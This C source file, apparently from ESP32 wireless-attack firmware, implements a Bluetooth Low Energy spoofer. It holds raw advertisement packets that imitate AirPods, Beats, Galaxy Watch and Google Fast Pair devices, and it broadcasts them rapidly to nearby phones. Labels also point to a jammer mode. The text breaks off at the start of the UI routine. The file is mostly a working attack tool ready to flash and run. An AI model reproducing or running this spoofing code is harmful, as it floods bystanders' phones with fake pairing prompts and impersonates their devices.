#include "ble_service.h"
#include "button_input.h"
#include "config.h"
#include "feature_text.h"
#include "freertos/FreeRTOS.h"
#include "freertos/queue.h"
#include "freertos/task.h"
#include "icon.h"
#include "settings_store.h"
#include "shared.h"
#include "stdatomic.h"
#include "touch_ui.h"
#include "ui_utils.h"

#ifdef TFT_BLACK
#undef TFT_BLACK
#endif
#define TFT_BLACK FEATURE_BG

#ifndef FEATURE_TEXT
#define FEATURE_TEXT ORANGE
#endif
#ifndef FEATURE_WHITE
#define FEATURE_WHITE 0xFFFF
#endif

#ifdef TFT_WHITE
#undef TFT_WHITE
#endif
#define TFT_WHITE FEATURE_TEXT

#ifdef WHITE
#undef WHITE
#endif
#define WHITE FEATURE_WHITE

#ifdef DARK_GRAY
#undef DARK_GRAY
#endif
#define DARK_GRAY UI_FG

static int bleScreenH(void) { return display_height(&(tft)); }

static int bleContentBottom(void) {
  return featureHasTouchNavBar() ? touchNavContentBottomY() : bleScreenH();
}

static inline uint32_t bleRandU32(uint32_t maxExclusive) {
  return maxExclusive ? (uint32_t)(esp_random() % maxExclusive) : 0U;
}

static inline int bleRandInt_1(int maxExclusive) {
  return maxExclusive > 0 ? (int)bleRandU32((uint32_t)maxExclusive) : 0;
}

static inline int bleRandInt_2(int minInclusive, int maxExclusive) {
  if (maxExclusive <= minInclusive) {
    return minInclusive;
  }
  return minInclusive + bleRandInt_1(maxExclusive - minInclusive);
}

static int bleMaxLinesInZone(int contentTop, int lineHeight) {
  const int h = bleContentBottom() - contentTop;
  if (h <= 0 || lineHeight <= 0) {
    return 1;
  }
  return h / lineHeight;
}

static void bleClearBody(uint16_t color) {
  if (featureHasTouchNavBar()) {
    featureClearContent(color);
  } else {
    display_fill_screen(&(tft), color);
  }
}

static void bleSetExitOnlyNavLabels(void) {
  setTouchNavLabels(NULL, NULL, "Exit", NULL, NULL);
}

static void bleSetJammerNavLabels(void) {
  setTouchNavLabels("Mode-", NULL, "Exit", "Toggle", "Mode+");
}

static void bleSetScannerNavLabels(void) {
  setTouchNavLabels("Cal", "Scan", "Exit", NULL, NULL);
}

static const unsigned long kBleNavDebounceMs = 200;

static void bleWaitButtonRelease(int pin) {
  while (isButtonPressed(pin)) {
    sys_sleep_ms(10);
  }
  sys_sleep_ms(kBleNavDebounceMs);
}

static void bleWaitNavRelease(int pin1, int pin2, int pin3) {
  while (isButtonPressed(pin1) || (pin2 >= 0 && isButtonPressed(pin2)) ||
         (pin3 >= 0 && isButtonPressed(pin3))) {
    sys_sleep_ms(10);
  }
  sys_sleep_ms(kBleNavDebounceMs);
}

void Scanner_scannerHandleNavButtons(void);

void ProtoKill_prokillHandleNavButtons(void);

static void bleSetSpooferNavLabels(void) {
  setTouchNavLabels("Prev", "Type", "Exit", "Power", "Next");
}

#undef SCREEN_HEIGHT
#define SCREEN_HEIGHT 250
#undef LINE_HEIGHT
#define LINE_HEIGHT 12
#undef MAX_LINES
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

enum {
  BleSpoofer_spooferBuffer_COUNT = MAX_LINES,
  BleSpoofer_spooferBuffer_OFFSET = 0
};
_Static_assert(BleSpoofer_spooferBuffer_OFFSET +
                       BleSpoofer_spooferBuffer_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define BleSpoofer_spooferBuffer                  \
  (*(text_t(*)[BleSpoofer_spooferBuffer_COUNT]) & \
   feature_text_slots[BleSpoofer_spooferBuffer_OFFSET])
uint16_t BleSpoofer_colorspooferBuffer[MAX_LINES];
int BleSpoofer_spooferlineIndex = 0;

static bool BleSpoofer_uiDrawn = false;

#define SCREEN_WIDTH TFT_WIDTH
#define SCREENHEIGHT TFT_HEIGHT
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 5

static int BleSpoofer_iconX[ICON_NUM] = {90, 130, 170, 210, 10};
static int BleSpoofer_iconY = STATUS_BAR_Y_OFFSET;

ble_advertiser_t* BleSpoofer_pAdvertising;
text_t BleSpoofer_devices_uuid = {.data =
                                      "00003082-0000-1000-9000-00805f9b34fb"};

uint32_t BleSpoofer_delayMillisecond = 1000;
unsigned long BleSpoofer_lastDebounceTimeNext = 0;
unsigned long BleSpoofer_lastDebounceTimePrev = 0;
unsigned long BleSpoofer_lastDebounceTimeAdvNext = 0;
unsigned long BleSpoofer_lastDebounceTimeAdvPrev = 0;

int BleSpoofer_lastButtonStateNext = 0;
int BleSpoofer_lastButtonStatePrev = 0;
int BleSpoofer_lastButtonStateAdvNext = 0;
int BleSpoofer_lastButtonStateAdvPrev = 0;

unsigned long BleSpoofer_lastDebounceTime = 0;
unsigned long BleSpoofer_debounceDelay = 500;

bool BleSpoofer_isAdvertising = false;

int BleSpoofer_scanTime = 5;
int BleSpoofer_deviceType = 1;
int BleSpoofer_delaySeconds = 1;
int BleSpoofer_advType = 1;
int BleSpoofer_attack_state = 1;
int BleSpoofer_device_choice = 0;
int BleSpoofer_device_index = 0;

// Samsung devices (15 bytes)
typedef struct BleSpoofer_WatchModel {
  uint8_t value;
  const char* name;
} BleSpoofer_WatchModel;
#define BleSpoofer_WatchModel_INITIALIZER {0}
;
const BleSpoofer_WatchModel BleSpoofer_samsungModels[] = {
    {0x01, "Galaxy Watch 4"},
    {0x02, "Galaxy Watch 5"},
    {0x03, "Galaxy Watch 6"}};
enum { BleSpoofer_samsungModelCount = 3 };
enum { BleSpoofer_SAMSUNG_ADV_SIZE = 15 };
const uint16_t BleSpoofer_SAMSUNG_COMPANY_ID = 0x0075;
const uint8_t BleSpoofer_SAMSUNG_ADV_TEMPLATE[BleSpoofer_SAMSUNG_ADV_SIZE] = {
    14,   0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00,
    0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x00};

// Google device (14 bytes, single model)
enum { BleSpoofer_GOOGLE_ADV_SIZE = 14 };
const uint16_t BleSpoofer_GOOGLE_FAST_PAIR_ID = 0xFE2C;
const uint8_t BleSpoofer_GOOGLE_ADV_TEMPLATE[BleSpoofer_GOOGLE_ADV_SIZE] = {
    0x03, 0x03, 0x2C, 0xFE,                    // Complete 16-bit Service UUIDs
    0x06, 0x16, 0x2C, 0xFE, 0x00, 0xB7, 0x27,  // Service Data
    0x02, 0x0A, 0x00  // TX Power (placeholder, set dynamically)
};

const uint8_t BleSpoofer_DEVICES[][31] = {
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
};

bool BleSpoofer_generateSamsungAdvPacket(uint8_t modelIndex,
                                         ble_adv_data_t* advData) {
  if (modelIndex >= BleSpoofer_samsungModelCount) return false;
  uint8_t advDataRaw[BleSpoofer_SAMSUNG_ADV_SIZE];
  memcpy(advDataRaw, BleSpoofer_SAMSUNG_ADV_TEMPLATE,
         BleSpoofer_SAMSUNG_ADV_SIZE);
  advDataRaw[BleSpoofer_SAMSUNG_ADV_SIZE - 1] =
      BleSpoofer_samsungModels[modelIndex].value;
  ble_adv_append(&((*advData)), advDataRaw, BleSpoofer_SAMSUNG_ADV_SIZE);
  return true;
}

bool BleSpoofer_generateGoogleAdvPacket(ble_adv_data_t* advData) {
  uint8_t advDataRaw[BleSpoofer_GOOGLE_ADV_SIZE];
  memcpy(advDataRaw, BleSpoofer_GOOGLE_ADV_TEMPLATE,
         BleSpoofer_GOOGLE_ADV_SIZE);
  advDataRaw[BleSpoofer_GOOGLE_ADV_SIZE - 1] =
      (uint8_t)(bleRandInt_1(121) - 100);
  ble_adv_append(&((*advData)), advDataRaw, BleSpoofer_GOOGLE_ADV_SIZE);
  return true;
}

ble_adv_data_t BleSpoofer_getAdvertismentData(void) {
  ble_adv_data_t oAdvertisementData = (ble_adv_data_t){0};

  if (BleSpoofer_device_choice == 0) {  // Apple
    ble_adv_append(&(oAdvertisementData),
                   BleSpoofer_DEVICES[BleSpoofer_device_index], 31);
  } else if (BleSpoofer_device_choice == 1) {  // Samsung
    uint8_t samsungIndex = BleSpoofer_device_index;
    BleSpoofer_generateSamsungAdvPacket(samsungIndex, &(oAdvertisementData));
  } else if (BleSpoofer_device_choice == 2) {  // Google
    BleSpoofer_generateGoogleAdvPacket(&(oAdvertisementData));
  }

  return oAdvertisementData;
}

enum { BleSpoofer_SPOOFER_LOG_TOP = 45 };

static int BleSpoofer_spooferPanelTop(void) {
  const int panelH = featureHasTouchNavBar() ? 27 : 50;
  return bleContentBottom() - panelH;
}

static int BleSpoofer_spooferLogBottom(void) {
  return BleSpoofer_spooferPanelTop();
}

static int BleSpoofer_spooferVisibleLines(void) {
  const int h = BleSpoofer_spooferLogBottom() - BleSpoofer_SPOOFER_LOG_TOP;
  if (h <= 0) {
    return 1;
  }
  return h / LINE_HEIGHT;
}

static bool BleSpoofer_spooferLineFits(int yPos) {
  return yPos + LINE_HEIGHT <= BleSpoofer_spooferLogBottom();
}

void BleSpoofer_Printspoofer(text_t text, uint16_t color, bool extraSpace) {
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  const int visibleLines = BleSpoofer_spooferVisibleLines();
  if (BleSpoofer_spooferlineIndex >= visibleLines) {
    for (int i = 0; i < visibleLines - 1; i++) {
      BleSpoofer_spooferBuffer[i] = BleSpoofer_spooferBuffer[i + 1];
      BleSpoofer_colorspooferBuffer[i] = BleSpoofer_colorspooferBuffer[i + 1];
    }
    BleSpoofer_spooferlineIndex = visibleLines - 1;
  }

  BleSpoofer_spooferBuffer[BleSpoofer_spooferlineIndex] = text;
  BleSpoofer_colorspooferBuffer[BleSpoofer_spooferlineIndex] = color;
  BleSpoofer_spooferlineIndex++;

  if (extraSpace && BleSpoofer_spooferlineIndex < visibleLines) {
    BleSpoofer_spooferBuffer[BleSpoofer_spooferlineIndex] = TEXT("");
    BleSpoofer_colorspooferBuffer[BleSpoofer_spooferlineIndex] = TFT_WHITE;
    BleSpoofer_spooferlineIndex++;
  }

  for (int i = 0; i < BleSpoofer_spooferlineIndex && i < visibleLines; i++) {
    int yPos = i * LINE_HEIGHT + BleSpoofer_SPOOFER_LOG_TOP;
    if (!BleSpoofer_spooferLineFits(yPos)) {
      continue;
    }

    display_fill_rect(&(tft), 5, yPos, display_width(&(tft)) - 10, LINE_HEIGHT,
                      TFT_BLACK);

    display_set_text_color_2(&(tft), BleSpoofer_colorspooferBuffer[i],
                             TFT_BLACK);
    display_set_cursor(&(tft), 5, yPos);
    display_print(&(tft), (BleSpoofer_spooferBuffer[i]).data);
  }
}

void BleSpoofer_sppferLoadingBar(int step) {
  int totalSteps = 4;
  int filledBlocks = (step * 20) / totalSteps;

  text_t bar = {.data = "["};
  for (int i = 0; i < 20; i++) {
    text_append_cstr(&(bar), (TEXT((i < filledBlocks) ? "#" : "_")).data);
  }
  text_append_cstr(&(bar), "]");

  BleSpoofer_Printspoofer(bar, TFT_GREEN, false);
}

static int BleSpoofer_s_spooferPanelLastTop = -1;
static int BleSpoofer_s_spooferPanelLastH = -1;
static int BleSpoofer_s_lastSpooferDevice = -1;
static int BleSpoofer_s_lastSpooferAdv = -1;
static bool BleSpoofer_s_spooferChromeReady = false;

enum { BleSpoofer_SPOOFER_VALUE_X = 58 };
enum { BleSpoofer_SPOOFER_VALUE_W = 178 };

static void BleSpoofer_spooferResetPanelCache(void) {
  BleSpoofer_s_spooferChromeReady = false;
  BleSpoofer_s_lastSpooferDevice = -1;
  BleSpoofer_s_lastSpooferAdv = -1;
  BleSpoofer_s_spooferPanelLastTop = -1;
  BleSpoofer_s_spooferPanelLastH = -1;
}

static const char* BleSpoofer_spooferDeviceLabel(int type) {
  switch (type) {
    case 1:
      return "Airpods";
    case 2:
      return "Airpods Pro";
    case 3:
      return "Airpods Max";
    case 4:
      return "Airpods Gen 2";
    case 5:
      return "Airpods Gen 3";
    case 6:
      return "Airpods Pro Gen 2";
    case 7:
      return "PowerBeats";
    case 8:
      return "PowerBeats Pro";
    case 9:
      return "Beats Solo Pro";
    case 10:
      return "Beats Buds";
    case 11:
      return "Beats Flex";
    case 12:
      return "BeatsX";
    case 13:
      return "Beats Solo3";
    case 14:
      return "Beats Studio3";
    case 15:
      return "Beats StudioPro";
    case 16:
      return "Beats FitPro";
    case 17:
      return "Beats BudsPlus";
    case 18:
      return "Galaxy Watch 4";
    case 19:
      return "Galaxy Watch 5";
    case 20:
      return "Galaxy Watch 6";
    case 21:
      return "Google Smart Ctrl";
    default:
      return "Airpods";
  }
}

static const char* BleSpoofer_spooferAdvLabel(int type) {
  switch (type) {
    case 1:
      return "IND";
    case 2:
      return "DIRECT 1";
    case 3:
      return "SCAN";
    case 4:
      return "NONCONN";
    case 5:
      return "DIRECT 0";
    default:
      return "IND";
  }
}

static text_t BleSpoofer_spooferFitText(const char* text, int maxWidth) {
  text_t out = TEXT(text);
  display_set_text_size(&(tft), 1);
  if (display_text_width(&(tft), (out).data, 0) <= maxWidth) {
    return out;
  }
  while (strlen((out).data) > 1 &&
         display_text_width(&(tft), (text_join_cstr((out).data, "...")).data,
                            0) > maxWidth) {
    text_erase(&(out), strlen((out).data) - 1, SIZE_MAX);
  }
  if (!(strlen((out).data) == 0)) {
    text_append_cstr(&(out), "...");
  }
  return out;
}

static void BleSpoofer_spooferDrawValueWell(int y, int h, const char* text) {
  display_fill_rect(&(tft), BleSpoofer_SPOOFER_VALUE_X, y,
                    BleSpoofer_SPOOFER_VALUE_W, h, DARK_GRAY);
  display_draw_rect(&(tft), BleSpoofer_SPOOFER_VALUE_X, y,
                    BleSpoofer_SPOOFER_VALUE_W, h, DARK_GRAY);

  text_t fitted =
      BleSpoofer_spooferFitText(text, BleSpoofer_SPOOFER_VALUE_W - 8);
  display_set_text_size(&(tft), 1);
  display_set_text_color_2(&(tft), TFT_WHITE, DARK_GRAY);
  display_set_cursor(&(tft), BleSpoofer_SPOOFER_VALUE_X + 4, y + ((h - 8) / 2));
  display_print(&(tft), (fitted).data);
}

static void BleSpoofer_spooferLayoutRows(int panelTop, int panelH, int* row1Y,
                                         int* row2Y, int* rowH,
                                         const char** advCaption) {
  if (panelH >= 36) {
    (*rowH) = 14;
    (*row1Y) = panelTop + 3;
    (*row2Y) = panelTop + 18;
    (*advCaption) = "Adv Type:";
  } else {
    (*rowH) = 10;
    (*row1Y) = panelTop + 2;
    (*row2Y) = panelTop + 13;
    (*advCaption) = "Adv:";
  }
}

void BleSpoofer_updateSpoofer(void) {
  const int panelTop = BleSpoofer_spooferPanelTop();
  const int panelH = bleContentBottom() - panelTop;
  if (panelTop < 40 || panelH <= 0) {
    return;
  }

  int row1Y = 0;
  int row2Y = 0;
  int rowH = 0;
  const char* advCaption = "Adv Type:";
  BleSpoofer_spooferLayoutRows(panelTop, panelH, &(row1Y), &(row2Y), &(rowH),
                               &(advCaption));

  const bool layoutChanged = (panelTop != BleSpoofer_s_spooferPanelLastTop ||
                              panelH != BleSpoofer_s_spooferPanelLastH);
  const bool needChrome = !BleSpoofer_s_spooferChromeReady || layoutChanged;
  const bool deviceChanged =
      (BleSpoofer_deviceType != BleSpoofer_s_lastSpooferDevice);
  const bool advChanged = (BleSpoofer_advType != BleSpoofer_s_lastSpooferAdv);

  if (!needChrome && !deviceChanged && !advChanged) {
    return;
  }

  if (needChrome) {
    display_draw_fast_h_line(&(tft), 0, panelTop - 1, 240, UI_LINE);
    display_fill_rect(&(tft), 0, panelTop, 240, panelH, DARK_GRAY);

    display_set_text_size(&(tft), 1);
    display_set_text_color_2(&(tft), TFT_WHITE, DARK_GRAY);
    display_set_cursor(&(tft), 5, row1Y + ((rowH - 8) / 2));
    display_print(&(tft), "Device:");
    display_set_cursor(&(tft), 5, row2Y + ((rowH - 8) / 2));
    display_print(&(tft), (TEXT(advCaption)).data);

    BleSpoofer_s_spooferChromeReady = true;
    BleSpoofer_s_spooferPanelLastTop = panelTop;
    BleSpoofer_s_spooferPanelLastH = panelH;
    BleSpoofer_s_lastSpooferDevice = -1;
    BleSpoofer_s_lastSpooferAdv = -1;
  }

  if (needChrome || deviceChanged) {
    BleSpoofer_spooferDrawValueWell(
        row1Y, rowH, BleSpoofer_spooferDeviceLabel(BleSpoofer_deviceType));
    BleSpoofer_s_lastSpooferDevice = BleSpoofer_deviceType;
  }

  if (needChrome || advChanged) {
    BleSpoofer_spooferDrawValueWell(
        row2Y, rowH, BleSpoofer_spooferAdvLabel(BleSpoofer_advType));
    BleSpoofer_s_lastSpooferAdv = BleSpoofer_advType;
  }
}

void BleSpoofer_Airpods(void) {
  BleSpoofer_device_choice = 0;
  BleSpoofer_device_index = 0;
  BleSpoofer_attack_state = 1;
}

void BleSpoofer_Airpods_pro(void) {
  BleSpoofer_device_choice = 0;
  BleSpoofer_device_index = 1;
  BleSpoofer_attack_state = 1;
}

void BleSpoofer_Airpods_Max(void) {
  BleSpoofer_device_choice = 0;
  BleSpoofer_device_index = 2;
  BleSpoofer_attack_state = 1;
}

void BleSpoofer_Airpods_Gen_2(void) {
  BleSpoofer_device_choice = 0;
  BleSpoofer_device_index = 3;
  BleSpoofer_attack_state = 1;
}

void BleSpoofer_Airpods_Gen_3(void) {
  BleSpoofer_device_choice = 0;
  BleSpoofer_device_index = 4;
  BleSpoofer_attack_state = 1;
}

void BleSpoofer_Airpods_Pro_Gen_2(void) {
  BleSpoofer_device_choice = 0;
  BleSpoofer_device_index = 5;
  BleSpoofer_attack_state = 1;
}

void BleSpoofer_Power_Beats(void) {
  BleSpoofer_device_choice = 0;
  BleSpoofer_device_index = 6;
  BleSpoofer_attack_state = 1;
}

void BleSpoofer_Power_Beats_Pro(void) {
  BleSpoofer_device_choice = 0;
  BleSpoofer_device_index = 7;
  BleSpoofer_attack_state = 1;
}

void BleSpoofer_Beats_Solo_Pro(void) {
  BleSpoofer_device_choice = 0;
  BleSpoofer_device_index = 8;
  BleSpoofer_attack_state = 1;
}

void BleSpoofer_Beats_Studio_Buds(void) {
  BleSpoofer_device_choice = 0;
  BleSpoofer_device_index = 9;
  BleSpoofer_attack_state = 1;
}

void BleSpoofer_Beats_Flex(void) {
  BleSpoofer_device_choice = 0;
  BleSpoofer_device_index = 10;
  BleSpoofer_attack_state = 1;
}

void BleSpoofer_Beats_X(void) {
  BleSpoofer_device_choice = 0;
  BleSpoofer_device_index = 11;
  BleSpoofer_attack_state = 1;
}

void BleSpoofer_Beats_Solo_3(void) {
  BleSpoofer_device_choice = 0;
  BleSpoofer_device_index = 12;
  BleSpoofer_attack_state = 1;
}

void BleSpoofer_Beats_Studio_3(void) {
  BleSpoofer_device_choice = 0;
  BleSpoofer_device_index = 13;
  BleSpoofer_attack_state = 1;
}

void BleSpoofer_Beats_Studio_Pro(void) {
  BleSpoofer_device_choice = 0;
  BleSpoofer_device_index = 14;
  BleSpoofer_attack_state = 1;
}

void BleSpoofer_Betas_Fit_Pro(void) {
  BleSpoofer_device_choice = 0;
  BleSpoofer_device_index = 15;
}

void BleSpoofer_Beats_Studio_Buds_Plus(void) {
  BleSpoofer_device_choice = 0;
  BleSpoofer_device_index = 16;
  BleSpoofer_attack_state = 1;
}

// Android devices
void BleSpoofer_Galaxy_Watch_4(void) {
  BleSpoofer_device_choice = 1;  // Samsung
  BleSpoofer_device_index = 0;
  BleSpoofer_attack_state = 1;
}

void BleSpoofer_Galaxy_Watch_5(void) {
  BleSpoofer_device_choice = 1;  // Samsung
  BleSpoofer_device_index = 1;
  BleSpoofer_attack_state = 1;
}

void BleSpoofer_Galaxy_Watch_6(void) {
  BleSpoofer_device_choice = 1;  // Samsung
  BleSpoofer_device_index = 2;
  BleSpoofer_attack_state = 1;
}

void BleSpoofer_Google_Smart_Ctrl(void) {
  BleSpoofer_device_choice = 2;  // Google
  BleSpoofer_device_index = 0;
  BleSpoofer_attack_state = 1;
}

void BleSpoofer_setAdvertisingData(void) {
  switch (BleSpoofer_deviceType) {
    case 1:
      BleSpoofer_Airpods();
      break;
    case 2:
      BleSpoofer_Airpods_pro();
      break;
    case 3:
      BleSpoofer_Airpods_Max();
      break;
    case 4:
      BleSpoofer_Airpods_Gen_2();
      break;
    case 5:
      BleSpoofer_Airpods_Gen_3();
      break;
    case 6:
      BleSpoofer_Airpods_Pro_Gen_2();
      break;
    case 7:
      BleSpoofer_Power_Beats();
      break;
    case 8:
      BleSpoofer_Power_Beats_Pro();
      break;
    case 9:
      BleSpoofer_Beats_Solo_Pro();
      break;
    case 10:
      BleSpoofer_Beats_Studio_Buds();
      break;
    case 11:
      BleSpoofer_Beats_Flex();
      break;
    case 12:
      BleSpoofer_Beats_X();
      break;
    case 13:
      BleSpoofer_Beats_Solo_3();
      break;
    case 14:
      BleSpoofer_Beats_Studio_3();
      break;
    case 15:
      BleSpoofer_Beats_Studio_Pro();
      break;
    case 16:
      BleSpoofer_Betas_Fit_Pro();
      break;
    case 17:
      BleSpoofer_Beats_Studio_Buds_Plus();
      break;
    case 18:
      BleSpoofer_Galaxy_Watch_4();
      break;
    case 19:
      BleSpoofer_Galaxy_Watch_5();
      break;
    case 20:
      BleSpoofer_Galaxy_Watch_6();
      break;
    case 21:
      BleSpoofer_Google_Smart_Ctrl();
      break;
    default:
      BleSpoofer_Airpods();
      break;
  }
}

void BleSpoofer_handleButtonPress(int pin, void (*callback)()) {
  static unsigned long lastPressTime[8] = {0};
  static uint8_t lastState[8] = {1, 1, 1, 1, 1, 1, 1, 1};

  int index = pin % 8;
  uint8_t currentState = isButtonPressed(pin) ? 0 : 1;

  if (currentState == 0 && lastState[index] == 1) {
    unsigned long currentTime = sys_monotonic_ms();

    if ((currentTime - lastPressTime[index]) > BleSpoofer_debounceDelay) {
      callback();
      lastPressTime[index] = currentTime;
    }
  }

  lastState[index] = currentState;
}

void BleSpoofer_changeDeviceTypeNext(void) {
  BleSpoofer_deviceType++;
  if (BleSpoofer_deviceType > 21) BleSpoofer_deviceType = 1;
  printf("Device Type Next: %d\n", BleSpoofer_deviceType);
  BleSpoofer_setAdvertisingData();
  BleSpoofer_updateSpoofer();
}

void BleSpoofer_changeDeviceTypePrev(void) {
  BleSpoofer_deviceType--;
  if (BleSpoofer_deviceType < 1) BleSpoofer_deviceType = 21;
  printf("Device Type Prev: %d\n", BleSpoofer_deviceType);
  BleSpoofer_setAdvertisingData();
  BleSpoofer_updateSpoofer();
}

void BleSpoofer_changeAdvTypeNext(void) {
  BleSpoofer_advType++;
  if (BleSpoofer_advType > 5) BleSpoofer_advType = 1;
  printf("Advertising Type Next: %d\n", BleSpoofer_advType);
  BleSpoofer_setAdvertisingData();
  BleSpoofer_updateSpoofer();
}

void BleSpoofer_changeAdvTypePrev(void) {
  BleSpoofer_advType--;
  if (BleSpoofer_advType < 1) BleSpoofer_advType = 5;
  printf("Advertising Type Prev: %d\n", BleSpoofer_advType);
  BleSpoofer_setAdvertisingData();
  BleSpoofer_updateSpoofer();
}

void BleSpoofer_toggleAdvertising(void) {
  BleSpoofer_isAdvertising = !BleSpoofer_isAdvertising;

  if (!BleSpoofer_isAdvertising) {
    ble_advertising_stop(BleSpoofer_pAdvertising);
    div_console_line(TEXT("Advertising stopped."));
    BleSpoofer_Printspoofer(TEXT("[!] Advertising stopped"), TFT_YELLOW, true);
    BleSpoofer_updateSpoofer();
  } else {
    if (BleSpoofer_attack_state == 1) {
      ble_adv_data_t oAdvertisementData = BleSpoofer_getAdvertismentData();
      ble_advertising_service_uuid(BleSpoofer_pAdvertising,
                                   (BleSpoofer_devices_uuid).data);
      (BleSpoofer_pAdvertising->data = oAdvertisementData);
      (BleSpoofer_pAdvertising->min_interval = 0x20);
      (BleSpoofer_pAdvertising->max_interval = 0x20);
      ble_advertising_preferred(BleSpoofer_pAdvertising, 0x20, 0x20);
      ble_advertising_start(BleSpoofer_pAdvertising);

      char line[64];
      snprintf(line, sizeof(line), "[+] Device Type: %d",
               BleSpoofer_deviceType);
      BleSpoofer_Printspoofer(TEXT(line), TFT_WHITE, false);
      snprintf(line, sizeof(line), "[+] Advertising Type: %d",
               BleSpoofer_advType);
      BleSpoofer_Printspoofer(TEXT(line), TFT_WHITE, false);
      BleSpoofer_Printspoofer(TEXT("[!] Advertising started"), TFT_YELLOW,
                              false);
    }

    div_console_line(TEXT("Advertising started."));
    BleSpoofer_updateSpoofer();
  }
}

void BleSpoofer_runUI(void) {
